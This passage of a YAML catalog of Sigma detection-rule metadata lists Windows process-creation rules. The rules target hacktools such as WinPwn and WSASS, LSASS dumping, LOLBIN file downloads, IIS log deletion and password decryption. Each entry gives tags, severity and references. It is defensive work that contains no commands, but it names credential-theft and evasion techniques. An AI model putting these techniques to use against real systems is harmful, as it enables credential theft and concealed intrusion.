  - attack.privilege-escalation
  - attack.discovery
  - attack.t1082
  - attack.t1087
  - attack.t1046
  time_window: ''
  references:
  - https://github.com/carlospolop/PEASS-ng
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d557dc06-62e8-4468-a8e8-7984124908ce
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_winpwn.yml
  name: HackTool - WinPwn Execution
  description: 'Detects commandline keywords indicative of potential usge of the tool
    WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1046
  - T1082
  - T1106
  - T1518
  - T1548.002
  - T1552.001
  - T1555
  - T1555.003
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.discovery
  - attack.execution
  - attack.privilege-escalation
  - attack.t1046
  - attack.t1082
  - attack.t1106
  - attack.t1518
  - attack.t1548.002
  - attack.t1552.001
  - attack.t1555
  - attack.t1555.003
  time_window: ''
  references:
  - https://github.com/S3cur3Th1sSh1t/WinPwn
  - https://www.publicnow.com/view/EB87DB49C654D9B63995FAD4C9DE3D3CC4F6C3ED?1671634841
  - https://reconshell.com/winpwn-tool-for-internal-windows-pentesting-and-ad-security/
  - https://github.com/redcanaryco/atomic-red-team/blob/4d6c4e8e23d465af7a2388620cfe3f8c76e16cf0/atomics/T1082/T1082.md
  - https://grep.app/search?q=winpwn&filter[repo][0]=redcanaryco/atomic-red-team
  false_positives:
  - Unknown
  notes: ''
- detection_id: 022eaba8-f0bf-4dd9-9217-4604b0bb3bb0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_wmiexec_default_powershell.yml
  name: HackTool - Wmiexec Default Powershell Command
  description: Detects the execution of PowerShell with a specific flag sequence that
    is used by the Wmiexec script
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.lateral-movement
  time_window: ''
  references:
  - https://github.com/fortra/impacket/blob/f4b848fa27654ca95bc0f4c73dbba8b9c2c9f30a/examples/wmiexec.py
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 589ac73f-8e12-409c-964e-31a2f5775ae2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_wsass.yml
  name: HackTool - WSASS Execution
  description: 'Detects execution of WSASS, a tool used to dump LSASS memory on Windows
    systems by leveraging WER''s

    (Windows Error Reporting) WerFaultSecure.EXE to bypass PPL (Protected Process
    Light) protections.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/TwoSevenOneT/WSASS
  - https://www.zerosalarium.com/2025/09/Dumping-LSASS-With-WER-On-Modern-Windows-11.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 66e563f9-1cbd-4a22-a957-d8b7c0f44372
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_xordump.yml
  name: HackTool - XORDump Execution
  description: Detects suspicious use of XORDump process memory dumping utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.t1003.001
  - attack.credential-access
  time_window: ''
  references:
  - https://github.com/audibleblink/xordump
  false_positives:
  - Another tool that uses the command line switches of XORdump
  notes: ''
- detection_id: 90dcf730-1b71-4ae7-9ffc-6fcf62bd0132
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hktl_zipexec.yml
  name: Suspicious ZipExec Execution
  description: ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools
    into a password-protected zip file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1202
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  - attack.t1202
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1451237393017839616
  - https://github.com/Tylous/ZipExec
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7be5fb68-f9ef-476d-8b51-0256ebece19e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hostname_execution.yml
  name: Suspicious Execution of Hostname
  description: Use of hostname to get information
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-6---hostname-discovery-windows
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/hostname
  false_positives:
  - Unknown
  notes: ''
- detection_id: 023394c4-29d5-46ab-92b8-6a534c6f447b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hwp_exploits.yml
  name: Suspicious HWP Sub Processes
  description: Detects suspicious Hangul Word Processor (Hanword) sub processes that
    could indicate an exploitation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  - T1203
  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  - attack.execution
  - attack.t1203
  - attack.t1059.003
  - attack.g0032
  time_window: ''
  references:
  - https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/
  - https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5&from_sample=5db135000388385a7644131f&block_redirect=1
  - https://twitter.com/cyberwar_15/status/1187287262054076416
  - https://blog.alyac.co.kr/1901
  - https://en.wikipedia.org/wiki/Hangul_(word_processor)
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4e762605-34a8-406d-b72e-c1a089313320
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_hxtsr_masquerading.yml
  name: Potential Fake Instance Of Hxtsr.EXE Executed
  description: 'HxTsr.exe is a Microsoft compressed executable file called Microsoft
    Outlook Communications.

    HxTsr.exe is part of Outlook apps, because it resides in a hidden "WindowsApps"
    subfolder of "C:\Program Files".

    Any instances of hxtsr.exe not in this folder may be malware camouflaging itself
    as HxTsr.exe

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4ae81040-fc1c-4249-bfa3-938d260214d9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_icacls_deny.yml
  name: Use Icacls to Hide File to Everyone
  description: Detect use of icacls to deny access for everyone in Users folder sometimes
    used to hide malicious files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.001
  tags:
  - attack.defense-evasion
  - attack.t1564.001
  time_window: ''
  references:
  - https://app.any.run/tasks/1df999e6-1cb8-45e3-8b61-499d1b7d5a9b/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9801abb8-e297-4dbf-9fbd-57dde0e830ad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ieexec_download.yml
  name: File Download And Execution Via IEExec.EXE
  description: Detects execution of the IEExec utility to download and execute files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Ieexec/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b2b048b0-7857-4380-b0fb-d3f0ab820b71
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_iexpress_susp_execution.yml
  name: Self Extracting Package Creation Via Iexpress.EXE From Potentially Suspicious
    Location
  description: 'Detects the use of iexpress.exe to create binaries via Self Extraction
    Directive (SED) files located in potentially suspicious locations.

    This behavior has been observed in-the-wild by different threat actors.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://strontic.github.io/xcyclopedia/library/iexpress.exe-D594B2A33EFAFD0EABF09E3FDC05FCEA.html
  - https://en.wikipedia.org/wiki/IExpress
  - https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/
  - https://www.virustotal.com/gui/file/602f4ae507fa8de57ada079adff25a6c2a899bd25cd092d0af7e62cdb619c93c/behavior
  false_positives:
  - Administrators building packages using iexpress.exe
  notes: ''
- detection_id: e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_iis_appcmd_http_logging.yml
  name: Disable Windows IIS HTTP Logging
  description: Disables HTTP logging on a Windows IIS web server as seen by Threat
    Group 3390 (Bronze Union)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.002/T1562.002.md#atomic-test-1---disable-windows-iis-http-logging
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2d3cdeec-c0db-45b4-aa86-082f7eb75701
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_iis_appcmd_service_account_password_dumped.yml
  name: Microsoft IIS Service Account Password Dumped
  description: Detects the Internet Information Services (IIS) command-line tool,
    AppCmd, being used to list passwords
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.t1003
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/microsoft-iis-service-account-password-dumped.html
  - https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA
  - https://www.netspi.com/blog/technical/network-penetration-testing/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9465ddf4-f9e4-4ebd-8d98-702df3a93239
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_iis_appcmd_susp_module_install.yml
  name: IIS Native-Code Module Command Line Installation
  description: Detects suspicious IIS native-code module installations via command
    line
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/
  - https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/
  false_positives:
  - Unknown as it may vary from organisation to organisation how admins use to install
    IIS modules
  notes: ''
- detection_id: 7c8af9b2-dcae-41a2-a9db-b28c288b5f08
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_iis_appcmd_susp_rewrite_rule.yml
  name: Suspicious IIS URL GlobalRules Rewrite Via AppCmd
  description: Detects usage of "appcmd" to create new global URL rewrite rules. This
    behaviour has been observed being used by threat actors to add new rules so they
    can access their webshells.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/malmoeb/status/1616702107242971144
  - https://learn.microsoft.com/en-us/answers/questions/739120/how-to-add-re-write-global-rule-with-action-type-r
  false_positives:
  - Legitimate usage of appcmd to add new URL rewrite rules
  notes: ''
- detection_id: 97dbf6e2-e436-44d8-abee-4261b24d3e41
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_iis_connection_strings_decryption.yml
  name: Microsoft IIS Connection Strings Decryption
  description: Detects use of aspnet_regiis to decrypt Microsoft IIS connection strings.
    An attacker with Microsoft IIS web server access via a webshell or alike can decrypt
    and dump any hardcoded connection strings, such as the MSSQL service account password
    using aspnet_regiis command.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.t1003
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/microsoft-iis-connection-strings-decryption.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0649be4a-aeb0-45b0-b89e-7f1668f6d9c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_iis_logs_deletion.yml
  name: IIS WebServer Log Deletion via CommandLine Utilities
  description: 'Detects attempts to delete Internet Information Services (IIS) log
    files via command line utilities, which is a common defense evasion technique
    used by attackers to cover their tracks.

    Threat actors often abuse vulnerabilities in web applications hosted on IIS servers
    to gain initial access and later delete IIS logs to evade detection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070
  tags:
  - attack.defense-evasion
  - attack.t1070
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/managing-iis-log-file-storage
  false_positives:
  - Deletion of IIS logs that are older than a certain retention period as part of
    regular maintenance activities.
  - Legitimate schedule tasks or scripts that clean up log files regularly.
  notes: ''
- detection_id: 043c4b8b-3a54-4780-9682-081cb6b8185c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_iis_susp_module_registration.yml
  name: Suspicious IIS Module Registration
  description: Detects a suspicious IIS module registration as described in Microsoft
    threat report on IIS backdoors
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.004
  tags:
  - attack.persistence
  - attack.t1505.004
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: 850d55f9-6eeb-4492-ad69-a72338f65ba4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_ilasm_il_code_compilation.yml
  name: C# IL Code Compilation Via Ilasm.EXE
  description: Detects the use of "Ilasm.EXE" in order to compile C# intermediate
    (IL) code to EXE or DLL.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Ilasm/
  - https://www.echotrail.io/insights/search/ilasm.exe
  false_positives:
  - Unknown
  notes: ''
- detection_id: f11f2808-adb4-46c0-802a-8660db50fa99
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_imagingdevices_unusual_parents.yml
  name: ImagingDevices Unusual Parent/Child Processes
  description: Detects unusual parent or children of the ImagingDevices.exe (Windows
    Contacts) process as seen being used with Bumblebee activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  time_window: ''
  references:
  - https://thedfirreport.com/2022/09/26/bumblebee-round-two/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 863218bd-c7d0-4c52-80cd-0a96c09f54af
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_imewbdld_download.yml
  name: Arbitrary File Download Via IMEWDBLD.EXE
  description: Detects usage of "IMEWDBLD.exe" to download arbitrary files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-10---windows---powershell-download
  - https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ce7cf472-6fcc-490a-9481-3786840b5d9b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_infdefaultinstall_execute_sct_scripts.yml
  name: InfDefaultInstall.exe .inf Execution
  description: Executes SCT script using scrobj.dll from a command in entered into
    a specially prepared INF file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md#atomic-test-4---infdefaultinstallexe-inf-execution
  - https://lolbas-project.github.io/lolbas/Binaries/Infdefaultinstall/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 75edd216-1939-4c73-8d61-7f3a0d85b5cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_installutil_download.yml
  name: File Download Via InstallUtil.EXE
  description: 'Detects use of .NET InstallUtil.exe in order to download arbitrary
    files. The files will be written to "%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE\"

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/pull/239
  false_positives:
  - Unknown
  notes: ''
- detection_id: d042284c-a296-4988-9be5-f424fadcc28c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml
  name: Suspicious Execution of InstallUtil Without Log
  description: Uses the .NET InstallUtil.exe application in order to execute image
    without log
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/
  - https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool
  false_positives:
  - Unknown
  notes: ''
- detection_id: 90fb5e62-ca1f-4e22-b42e-cc521874c938
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_java_keytool_susp_child_process.yml
  name: Suspicious Shells Spawn by Java Utility Keytool
  description: Detects suspicious shell spawn from Java utility keytool process (e.g.
    adselfservice plus exploitation)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://redcanary.com/blog/intelligence-insights-december-2021
  - https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: cea2b7ea-792b-405f-95a1-b903ea06458f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_java_manageengine_susp_child_process.yml
  name: Suspicious Child Process Of Manage Engine ServiceDesk
  description: Detects suspicious child processes of the "Manage Engine ServiceDesk
    Plus" Java web service
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1102
  tags:
  - attack.command-and-control
  - attack.t1102
  time_window: ''
  references:
  - https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/
  - https://github.com/horizon3ai/CVE-2022-47966/blob/3a51c6b72ebbd87392babd955a8fbeaee2090b35/CVE-2022-47966.py
  - https://blog.viettelcybersecurity.com/saml-show-stopper/
  false_positives:
  - Legitimate sub processes started by Manage Engine ServiceDesk Pro
  notes: ''
- detection_id: 8f88e3f6-2a49-48f5-a5c4-2f7eedf78710
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_java_remote_debugging.yml
  name: Java Running with Remote Debugging
  description: Detects a JAVA process running with remote debugging allowing more
    than just localhost to connect
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  tags:
  - attack.t1203
  - attack.execution
  time_window: ''
  references:
  - https://dzone.com/articles/remote-debugging-java-applications-with-jdwp
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0d34ed8b-1c12-4ff2-828c-16fc860b766d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_java_susp_child_process.yml
  name: Suspicious Processes Spawned by Java.EXE
  description: Detects suspicious processes spawned from a Java host process which
    could indicate a sign of exploitation (e.g. log4j)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/
  false_positives:
  - Legitimate calls to system binaries
  - Company specific internal usage
  notes: ''
- detection_id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_java_susp_child_process_2.yml
  name: Shell Process Spawned by Java.EXE
  description: Detects shell spawned from Java host process, which could be a sign
    of exploitation (e.g. log4j exploitation)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/
  false_positives:
  - Legitimate calls to system binaries
  - Company specific internal usage
  notes: ''
- detection_id: 60bfeac3-0d35-4302-8efb-1dd16f715bc6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_java_sysaidserver_susp_child_process.yml
  name: Suspicious SysAidServer Child
  description: Detects suspicious child processes of SysAidServer (as seen in MERCURY
    threat actor intrusions)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1210
  tags:
  - attack.lateral-movement
  - attack.t1210
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 52788a70-f1da-40dd-8fbd-73b5865d6568
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_jsc_execution.yml
  name: JScript Compiler Execution
  description: 'Detects the execution of the "jsc.exe" (JScript Compiler).

    Attacker might abuse this in order to compile JScript files on the fly and bypassing
    application whitelisting.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Jsc/
  - https://www.phpied.com/make-your-javascript-a-windows-exe/
  - https://twitter.com/DissectMalware/status/998797808907046913
  false_positives:
  - Legitimate use to compile JScript by developers.
  notes: ''
- detection_id: d047726b-c71c-4048-a99b-2e2f50dc107d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_kavremover_uncommon_execution.yml
  name: Kavremover Dropped Binary LOLBIN Usage
  description: Detects the execution of a signed binary dropped by Kaspersky Lab Products
    Remover (kavremover) which can be abused as a LOLBIN to execute arbitrary commands
    and binaries.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://nasbench.medium.com/lolbined-using-kaspersky-endpoint-security-kes-installer-to-execute-arbitrary-commands-1c999f1b7fea
  false_positives:
  - Unknown
